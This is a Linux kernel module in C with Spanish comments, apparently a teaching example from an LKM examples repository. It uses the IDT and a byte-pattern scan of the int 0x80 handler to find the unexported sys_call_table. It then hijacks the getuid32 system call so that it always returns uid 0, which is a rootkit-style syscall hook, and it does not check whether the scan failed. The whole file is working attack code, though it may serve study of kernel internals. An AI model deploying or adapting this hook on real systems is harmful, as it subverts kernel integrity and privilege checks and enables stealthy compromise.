#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/mm.h>
/* para las pruebas ;) */
#include <asm/unistd.h>
/* IDT mira el artículo ! */
struct {
        unsigned short off1;
        unsigned short sel;
        unsigned char none,flags;
        unsigned short off2;
} __attribute__ ((packed)) idt;

/* IDTR mira el artículo ! */
struct {
        unsigned short limit;
        unsigned int base;
} __attribute__ ((packed)) idtr;
/* el hook */
uid_t (* restaura)(void);
/* la Sys_call_table ya no se exporta... ;) */
int *sys_call_table;
/* siempre uid 0 :) */
uid_t cero_uid(void){
	return 0;
}
/* el hack */
static void syscalltable(void) {
        unsigned int offs,i;
        char sccall[128];
	/* ok, necesitamos IDT */
        asm("sidt %0" : "=m" (idtr));
        printk(KERN_ALERT
	"[IDTR] Base en @:0x%x\n", idtr.base);
	/* idt[80h]  */
        memcpy(&idt,(void *)(idtr.base+8*0x80), sizeof(idt));
        offs = (idt.off2 << 16) | idt.off1;
        printk(KERN_ALERT 
	"[IDT(80h)] Descriptor en @:0x%x\n \
	...verificando 'call'...\n", offs);
        memcpy(sccall, (void *)offs ,128);
	/* vamos a ver si encontramos la cadenita FF1485 por ahí :) */
	i=0;
	while((i<128) &&
	 !((sccall[i]  == '\xff') &&
	   (sccall[i+1]== '\x14') &&
	   (sccall[i+2]== '\x85'))){
	i++;
	}	sys_call_table =(void*) (*(int *) &sccall[i+3]);
        	printk(KERN_ALERT 
		"[OK!] Sys_call_table ->  0x%p\n", sys_call_table);
		/* aquí la tenemos :) NO verifico que no se haya encontrado :P */
}	
/* empieza */
static int __init buscarsct(void) {
	printk(KERN_ALERT
	 "[CARGADO!] Buscando Sys_call_table...\n");
	syscalltable();
	/* vamos a ver si es verdad... ;) */
	restaura=sys_call_table[__NR_getuid32];
	sys_call_table[__NR_getuid32]=cero_uid;
	return 0; 
}
/* lo ponemos todo en orden */
static void __exit descarga(void) {
	sys_call_table[__NR_getuid32]=restaura;
	printk("LKM descargado!");
}
/* tu nombre? */
module_init(buscarsct);
module_exit(descarga);
/* :) */
MODULE_LICENSE("GPL");
MODULE_AUTHOR("https://github.com/jmporcelg/lkm-examples");
MODULE_DESCRIPTION("Obtener la Sys_call_table[]");
